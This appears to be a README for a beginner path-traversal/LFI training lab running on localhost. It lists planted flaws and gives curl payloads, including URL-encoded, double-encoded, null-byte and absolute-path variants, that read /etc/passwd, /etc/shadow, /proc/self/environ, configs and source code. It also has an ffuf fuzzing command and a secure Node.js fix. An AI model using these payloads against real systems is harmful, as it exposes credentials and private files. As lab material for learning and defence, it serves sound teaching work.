# Lab 10 — Path Traversal / Local File Inclusion (LFI) 🔴

**Port:** `8010`  
**Stack:** Node.js (no DB)  
**Difficulty:** Beginner

---

## 🕳️ Security Loopholes

1. **Naive `..` String Check** — Blocked in one endpoint but trivially bypassed with URL encoding (`%2e%2e%2f`)
2. **Unrestricted File Read in `/logs`** — Takes an absolute path directly, no restriction
3. **`/download` Prepend Bypass** — Prepends `/app/` but `../` sequences escape it
4. **Config Reader Not Scoped** — `path.join('/app/config', name)` is bypassable with `../`

---

## 🎯 Attack Scenarios

### Scenario A — Bypass Naive `..` Check
```bash
docker compose up -d

# Direct attempt blocked
curl "http://localhost:8010/files/../config/db.conf"
# Returns: {"error":"Invalid filename"}

# Bypass with URL-encoded path traversal
curl "http://localhost:8010/files/%2e%2e%2fconfig%2fdb.conf"

# Double-encoded bypass
curl "http://localhost:8010/files/%252e%252e%252fconfig%252fdb.conf"

# Read /etc/passwd via double-encoded traversal
curl "http://localhost:8010/files/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
```

### Scenario B — Direct Absolute Path via `/logs`
```bash
# No check at all — pass absolute paths directly
curl "http://localhost:8010/logs?file=/etc/passwd"
curl "http://localhost:8010/logs?file=/etc/shadow"
curl "http://localhost:8010/logs?file=/app/config/db.conf"
curl "http://localhost:8010/logs?file=/proc/self/environ"
curl "http://localhost:8010/logs?file=/proc/self/cmdline"
```

### Scenario C — Escape Prepended Path in `/download`
```bash
# Normal usage
curl "http://localhost:8010/download?path=files/public.txt"

# Traverse out of /app/
curl "http://localhost:8010/download?path=../../etc/passwd"
curl "http://localhost:8010/download?path=../config/db.conf"
```

### Scenario D — Config Traversal
```bash
# Intended: /app/config/db.conf
curl "http://localhost:8010/config?name=db"

# Escape: reads /app/config/../../etc/passwd → /etc/passwd
curl "http://localhost:8010/config?name=../../etc/passwd%00"  # null byte (older Node)
curl "http://localhost:8010/config?name=../app.js"  # read source code!
```

### Scenario E — Automated with ffuf
```bash
# Use a path traversal wordlist
ffuf -u "http://localhost:8010/logs?file=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -mc 200 -fs 0
```

---

## 🛠️ Tools

| Tool | Command |
|------|---------|
| `curl` | Manual URL-encoded traversal |
| `ffuf` | `ffuf -u .../logs?file=FUZZ -w LFI-Jhaddix.txt` |
| Burp Suite Intruder | Payload: path traversal list |
| `dotdotpwn` | Automated path traversal fuzzer |

---

## 🔐 How to Fix

```javascript
const path = require('path');

app.get('/files/:filename', (req, res) => {
  // Resolve the full path AFTER joining
  const requestedPath = path.resolve(FILES_DIR, req.params.filename);

  // Ensure the resolved path starts with the allowed base directory
  if (!requestedPath.startsWith(FILES_DIR + path.sep)) {
    return res.status(403).json({ error: 'Access denied' });
  }

  // Only allow specific extensions
  const ext = path.extname(requestedPath);
  if (!['.txt', '.pdf', '.png'].includes(ext)) {
    return res.status(403).json({ error: 'File type not allowed' });
  }

  res.sendFile(requestedPath);
});
```
